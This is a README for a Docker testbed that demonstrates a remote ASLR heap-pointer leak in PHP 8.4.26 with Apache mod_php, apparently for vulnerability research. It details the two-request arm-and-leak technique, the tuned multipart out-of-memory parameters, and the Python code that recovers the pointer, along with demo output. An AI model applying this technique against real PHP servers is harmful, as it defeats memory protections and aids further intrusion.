# php2leak — remote ASLR leak (heap)

A Docker testbed that reproduces the **ASLR-leak** possible due to
CVE-2026-109618 / CVE-2026-109619 on a vulnerable **PHP 8.4.26 + Apache
`mod_php` (prefork)** build, and **leaks the Zend MM heap base (an
ASLR-randomized address) over HTTP** from a second container with **pwntools**.

The leak is fully remote, but it uses a slightly artificial `SID` constant
reflected in the response body. This is for demonstrative purposes only.

> All `php-src` references are kept inline as comments.

---

```text
❯ ./demo_aslr.sh
== run 1 ==
  [leak]
    [*] heap ptr = 0x0000785c1a254090
    [+] Zend MM chunk base (ASLR): 0x0000785c1a200000
  [ground truth] debug.php
    785c1a200000-785c1a400000  [anon:zend_alloc]
    785c1a470000-785c1a5c6000  /usr/lib/apache2/modules/libphp.so
    785c1a5c6000-785c1aac9000  /usr/lib/apache2/modules/libphp.so
    785c1aac9000-785c1b5ce000  /usr/lib/apache2/modules/libphp.so
    785c1b5ce000-785c1b6a7000  /usr/lib/apache2/modules/libphp.so
    785c1b6a7000-785c1b771000  /usr/lib/apache2/modules/libphp.so
== run 2 (restart -> ASLR) ==
  [leak]
    [*] heap ptr = 0x00007fc03b654090
    [+] Zend MM chunk base (ASLR): 0x00007fc03b600000
  [ground truth] debug.php
    7fc03b600000-7fc03b800000  [anon:zend_alloc]
    7fc03b8c5000-7fc03ba1b000  /usr/lib/apache2/modules/libphp.so
    7fc03ba1b000-7fc03bf1e000  /usr/lib/apache2/modules/libphp.so
    7fc03bf1e000-7fc03ca23000  /usr/lib/apache2/modules/libphp.so
    7fc03ca23000-7fc03cafc000  /usr/lib/apache2/modules/libphp.so
    7fc03cafc000-7fc03cbc6000  /usr/lib/apache2/modules/libphp.so
```

## How it works

Both CVEs meet at `php_request_startup()`: a `multipart/form-data` body is
parsed **before** any module `RINIT` or application code runs (`main/main.c`):

```c
php_hash_environment();     /* PRE-RINIT: parse multipart, fire session
                             *   upload-progress callback                    */
zend_activate_modules();    /* RINIT runs *after* the POST body              */
PG(modules_activated) = 1;
```

The worker is a persistent prefork child, so its ASLR layout and `.bss` module
globals (`PS(id)`, `PS(http_session_vars)`) stay fixed across requests on the
same PID. The exploit sends both requests over **one HTTP/1.1 keep-alive
connection**, which prefork MPM serves from the same child, so no worker-pinning
config is needed.

| Step | Request | What happens (source) |
| :--- | :--- | :--- |
| **Arm** | N | `PHP_SESSION_UPLOAD_PROGRESS` + `PHPSESSID "\x00"` + a file part publish `PS(id)` at `MULTIPART_EVENT_FILE_START`; then ~990 `filename=""` empty-upload parts (each builds 6 `$_FILES` entries under a 62-deep nested name) cross `memory_limit`, `_zend_bailout()` longjmps out, module `RSHUTDOWN` is skipped (`PG(modules_activated)==0`), and `shutdown_memory_manager()` wipes the request heap while `PS(id)` keeps pointing into it |
| **Leak** | N+1 | upload-progress + short `PHPSESSID "Z"` + packed array `c[0..39]="V"*20` → `php_session_rfc1867_cleanup()` → `php_session_initialize()` → `php_session_reset_id()` builds the `SID` constant from the dangling `PS(id)` |

`php_session_reset_id()` registers `SID` **unconditionally** (no `send_cookie`):

```c
/* ext/session/session.c */
if (PS(define_sid)) {
    smart_str var = {0};
    smart_str_appends(&var, PS(session_name));    /* "PHPSESSID"            */
    smart_str_appendc(&var, '=');
    smart_str_appends(&var, ZSTR_VAL(PS(id)));    /* dangling bytes (strlen) */
    smart_str_0(&var);
    REGISTER_STRINGL_CONSTANT("SID", ...);
}
```

The leak request's packed array recycles the freed 64-byte `PS(id)` slot. A
packed array stores its values as contiguous 16-byte `zval`s
(`Zend/zend_types.h`), each holding a pointer to its value `zend_string`:

```c
zval:  +0x00 zend_value (ptr to "V"*20)  +0x08 u1.type_info=0x0106  +0x0c u2
```

`smart_str_appends()` copies that with `strlen`, i.e. the low 6 bytes of the
first pointer up to its `0x00` high byte. The target script does `echo SID`, so
the response body carries those 6 raw bytes:

```text
SID=PHPSESSID=\x90@eU%}
```

From them we reconstruct the pointer and the 2 MB-aligned chunk base:

```python
ptr        = struct.unpack("<Q", leaked6 + b"\x00\x00")[0]  # 0x00007d2555654090
chunk_base = ptr & ~0x1fffff                                # 0x7d2555600000
```

`chunk_base` matches the worker's real `[anon:zend_alloc]` mmap (verifiable via
`grep zend_alloc /proc/<pid>/maps`), and re-randomizes on restart:

```text
== run 1 ==
heap ptr = 0x000079773dc54090
Zend MM chunk base (ASLR): 0x000079773dc00000
== run 2 (restart -> ASLR) ==
heap ptr = 0x00007eb533254090
Zend MM chunk base (ASLR): 0x00007eb533200000
```

---

## Layout

```text
php2leak/
├── docker-compose.yml
├── demo_aslr.sh                # leak, twice (restart -> ASLR)
├── target/
│   ├── Dockerfile              # php:8.4.26-apache-bookworm (stock prefork MPM)
│   ├── php.ini                 # no overrides (fully default PHP config)
│   ├── index.php               # echo SID (reflects the leak)
│   └── debug.php               # ground-truth addresses (/proc/self/maps)
└── attacker/
    ├── Dockerfile              # python:3.12 + pwntools
    └── leak.py                 # leak + chunk-base recovery
```

---

## Build & run

```bash
docker compose build                  # build images
docker compose up -d target           # start vulnerable target

./demo_aslr.sh        # end-to-end leak, twice (restart -> ASLR)

# or a single run:
docker compose run --rm attacker
```

---

## Notes

- **App-dependence:** this build reflects the leak via `echo SID` (the app must
  surface the `SID` constant). The *application-agnostic* channel is the
  `Set-Cookie: PHPSESSID=` header, but that is gated by `PS(send_cookie)`, which
  `MULTIPART_EVENT_FILE_START` force-clears to `0` — and the usual
  `url_encode`-OOM dodge is impossible because `session.sid_length <= 256`.
  `SID` sidesteps both.
- **Arming detail:** the upload-progress `FORMDATA` handler only captures the
  session id when `value_len > 0`, so an empty `PHPSESSID` is ignored and
  `FILE_START` never fires. `leak.py` arms with `"\x00"` so it's captured yet
  `ZSTR_VAL(PS(id))[0]=='\0'`, forcing regeneration of the id that later dangles.
- **Default-config OOM:** the amplifier uses Calif's empty-upload trick —
  `filename=""` parts are not counted toward `max_file_uploads`, but each still
  builds the six `$_FILES` entries (`name`, `full_path`, `type`, `tmp_name`,
  `error`, `size`) under the nested name, giving ~6× amplification. 990 parts ×
  62 deep crosses the default `memory_limit=128M` while staying under
  `max_input_vars=1000`, `max_input_nesting_level=64`, and `post_max_size=8M`.
- **Heap alignment:** the reclaim is sensitive to the exact allocation sequence
  (boundary string, field names, value lengths). The values above are tuned for
  this build; a different PHP version/config needs re-tuning.

## Cleanup

```bash
docker compose down -v
```
